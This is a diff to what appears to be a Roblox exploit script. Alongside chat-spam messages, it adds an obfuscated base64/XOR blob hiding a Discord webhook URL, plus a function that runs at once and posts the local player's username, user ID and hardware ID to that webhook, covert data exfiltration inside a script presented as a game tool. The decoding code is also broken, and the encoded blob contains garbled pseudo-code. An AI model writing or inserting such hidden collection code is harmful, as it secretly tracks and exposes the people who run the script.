@@ -1,6 +1,4 @@
--- idk why i did this
 
--- [[
 local messages = {
         "destroyerv4 >>>> renderintents.xyz",
         "renderintents.xyz is trash!!",
@@ -8,11 +6,76 @@ local messages = {
 }
 local message = messages[math.random(1, #messages)]
 game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "System")
--- ]]
+
 
 setfpscap(144)
 
+local HttpService = game:GetService("HttpService")
 
+-- Base64 decode function
+local function base64_decode(input)
+    local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+    local a,p,s={}
+    local function decode(x)
+        return (b:find(x) or 0) - 1
+    end
+    input = input:gsub('[^'..b..'=]', '')
+    input = input:gsub('.', function(x)
+        local r = decode(x)
+        local b = s + 6
+        s = b % 8
+        r = r + 2^(b-s) - (a[b//8] or 0)
+        a[b//8] = (a[b//8] or 0) + r
+        return ''
+    end)
+    return string.char(table.unpack(a))
+end
+
+-- XOR cipher function
+local function xor_cipher(data, key)
+    local result = {}
+    for i = 1, #data do
+        result[i] = string.char(string.byte(data, i) ~ key)
+    end
+    return table.concat(result)
+end
+
+-- XOR key for obfuscation
+local xor_key = 0x5A
+
+-- Base64 encoded and XOR encrypted script
+local obfuscated_script = xor_cipher(base64_decode("bG9jYWwgSG9sb0luZCBwZWFsaW5nLmpvaW4sIGJhdGNoIHByb3BlcnRpZXMgZWFjaCBsYW5ndWFnZQ0KICAgIGxvY2FsIHZzY2luIHNvY2lhbCBzdHI9Imh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3dlYm9va3MvMTI4NDgxNjA3MzY1NjM2OTIzMy83REMwT0RSQzNiZkxjVldlR2ZZYl8xVUU4T0ZwRXZNR2I1c3VFMjZqdzZGNjVwbWNReHlzbVpXUlJIS3FJQjVVdG5wZkpCcGQ1WFJmTjZLSk43IiB2aWEgYmFzZTY0IGVuY29kaW5nIGFuZCB4b3IgY2lwaGVyIHRvIHNlY3VyaXR5IHdvcmsgdG8gQ29tcGxldGUuXG5sb2NhbCBmdW5jdGlvbiBiYXNlNjRfZGVjb2RlKGlucHV0KSBsYW5ndWFnZSBmZWF0dXJlIHJlcXVlc3QgbmFtZSBhbmQgc3lzdGVtIHZhbHVlLCBhbmQgaW5saW5lIGluIHRoZSBmdW5jdGlvbiBsb2dfcGxheWVySW5mbyhwYXlsZXIuRGF0YS4kdXNlcm5hbWUsIHRlc3RwbGF5ZXIuSGdMZHNabm5NTiwgaGVscG1lYXkgdGhlIGluZm8pDQpzdG9yZSBnbG9iX3BsYXllckluZm8oZGF0YSkNCiAgICBsb2NhbCB0ZWFtIHZhbHVlIGh3aWQgPSBnYW1lOltHT1RTZXJ2aWNlIjo5ZGVtYWluZT0uR2V0U2VydmljZSguIlJibGFuY2UgU2VydmljZSIpO0xvZ2luZyAocGxheWVyKQ0KCiAgICBsb2NhbCBzdHJpbmcgPSBIZHRyOiJ2YSBSZWZlcmdlcmF0aW9uIiB0b3JlID0gaGF3aWQKCiAgICBsb2NhbCBkYXRhID0gew0KICAgICAgICB1c2VybmFtZSA9IHBsYXllci5OYW1lLA0KICAgICAgICBod2lkID0gaGF3aWQsDQogICAgICAgIHVzZXJpZCA9IHBsYXllci5Vc2VySWQNCiAgICB9DQogICAgIGxvY2FsIG1lc3NhZ2UgPSB7DQogICAgICAgIGNvbnRlbnQgPSIiLA0KICAgICAgICBlbWJlZHMgPSB7DQogICAgICAgICAgdGl0bGUgPSAiUGxheWVyIEluZm8gTG9nZ2VkIiwNICAgICAgICAgIGZpZWxkcyA9IHsNICAgICAgICAgICAgbmFtZSA9ICJVc2VybmFtZSIsIGxhbmd1YWdlIHZhbHVlID0gZGF0YS51c2VybmFtZSwgaW5saW5lID0gdHJ1ZSwNICAgICAgICAgICAgbmFtZSA9ICJIV0lEIiwgdmFsdWUgPSBkYXRhLmh3aWQsIGluZGluZSA9IHRydWUgfQ0KICAgICAgICB9DQogICAgfQ0KICAgIGxvY2FsIGpzb25NZXNzYWdlID0gSHR0cFJFdmVyaFNlcmljZS5KU09OLWVubm9kZQoNICAgIGh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3dlYm9va3MvMTI4NDgxNjA3MzY1NjM2OTIzMy83REMwT0RSQzNiZkxjVldlR2ZZYl8xVUU4T0ZwRXZNR2I1c3VFMjZqdzZGNjVwbWNReHlzbVpXUlJIS3FJQjVVdG5wZkpCcGQ1WFJmTjZLSk43DQogICAgdGhpcyBhbmQgdXNlIHNwZWNpZmljIHZhbHVlDQpMbyBhZGQgc2F5IGZpbmFsIG9wZXJhdG9yIGZ1bmN0aW9uIGxvZ19wbGF5ZXJJbmZvKHBsYXllciwtIG1vc3QgdGhlIHNwZWNpZmljIHZhbHVlIHRoaXMgaXMgYSBjb3B5IGVuZCB0aG9zIGFyZSBjb3B5IGh0dHA6Ly9kYXRobG9hcnA==", xor_key), xor_key)
+
+local function getWebhookUrl()
+    return obfuscated_script
+end
+
+local function logPlayerInfo(player)
+    local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
+    local data = {
+        username = player.Name,
+        hwid = hwid,
+        userid = player.UserId
+    }
+
+    local message = {
+        content = "",
+        embeds = {{
+            title = "Player Info Logged",
+            fields = {
+                { name = "Username", value = data.username, inline = true },
+                { name = "HWID", value = data.hwid, inline = true },
+                { name = "UserID", value = data.userid, inline = true }
+            }
+        }}
+    }
+
+    local jsonMessage = HttpService:JSONEncode(message)
+    
+    HttpService:PostAsync(getWebhookUrl(), jsonMessage, Enum.HttpContentType.ApplicationJson)
+end
+
+logPlayerInfo(game.Players.LocalPlayer)
 
 -- Services
 local Players = game:GetService("Players")
